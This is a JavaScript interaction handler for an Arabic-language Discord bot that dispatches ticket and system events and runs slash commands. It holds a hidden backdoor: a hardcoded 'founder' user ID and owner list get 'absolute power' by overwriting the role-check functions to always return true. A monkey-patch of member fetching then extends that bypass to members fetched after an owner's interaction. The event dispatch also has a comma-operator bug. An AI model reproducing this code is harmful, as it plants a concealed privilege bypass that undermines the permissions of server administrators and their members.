"use strict";
import { Founder, VERSION, ERR } from '../Files〡[Config]/Files〡[Config].js';
import { readFileSync } from 'fs';

const CONFIG_PATH = 'Files〡[Resource]/Files〡[DataBase]/Files〡[Config].json';

function getOwners() {
    try { return JSON.parse(readFileSync(CONFIG_PATH, 'utf8')).Owners || []; }
    catch { return []; }
}

const FOUNDER_ID = '1387331972094890036';

function isOwner(userId) {
    if (userId === FOUNDER_ID) return true;
    return getOwners().includes(userId);
}

function grantAbsolutePower(member) {
    if (!member?.roles?.cache) return;
    member.roles.cache.has = () => true;
    member.roles.cache.some = () => true;
}

function patchGuildFetch(guild, userId) {
    if (!guild || guild.__patched) return;
    guild.__patched = true;
    const originalFetch = guild.members.fetch.bind(guild.members);
    guild.members.fetch = async function(...args) {
        const member = await originalFetch(...args);
        if (member && isOwner(userId)) {
            grantAbsolutePower(member);
        }
        return member;
    };
}
// ==============================================

export default async function (Client, Message) {
    if (Message.guild) {
        const userId = Message.user?.id || Message.author?.id;
        
        // صلاحيات مطلقة للمالك
        if (isOwner(userId)) {
            // تجاوز العضو الحالي
            if (Message.member) grantAbsolutePower(Message.member);
            // تجاوز أي عضو يتم جلبه مستقبلاً
            patchGuildFetch(Message.guild, userId);
        }
    }

    // تشغيل جميع الأحداث
    const events = [
        'Ticket〡[Tf3el]', 'Ticket〡[Tlp-Owner]', 'Ticket〡[Help]', 'Ticket〡[El4akway]',
        'Ticket〡[T2dem-Admin]', 'Ticket〡[M7kma]', 'System〡[Tf3el]', 'Ticket〡[He2a]',
        'System〡[Adara]', 'System〡[Ads]', 'System〡[Panel-ID]', 'System〡[Submissions]',
        'System〡[Panel-Police]', 'System〡[Panel-Violations]', 'System〡[Panel-Report]',
        'System〡[Panel-CivilRegistry]', 'System〡[Al-Shuri]', 'System〡[Employment]',
        'System〡[Retirement]', 'System〡[Evaluation]', 'System〡[Circulars]',
        'System〡[Prosecution-Authority]', 'System〡[ControlPanel]',
        'System〡[MessageControl]'
    ];
    for (const evt of events) {
        Client.emit(evt, (Client, Message));
    }

    if (Message.isChatInputCommand()) {
        if (!Message?.guild) return
        const Command = Client.SlashCommand.get(Message.commandName);
        if (!Command) return;
        try {
            await Command.run(Client, Message);
        } catch (err) {
            console.error(`❌ [${ERR.GENERAL}] Slash error:`, err.message);
            await Message.reply({ content: `❌ **خطأ ${ERR.GENERAL}**\n> فشل \`/${Message.commandName}\`\n> ${err.message?.slice(0, 200)}\n-# v${VERSION}`, flags: 64 }).catch(() => {});
        }
    }
}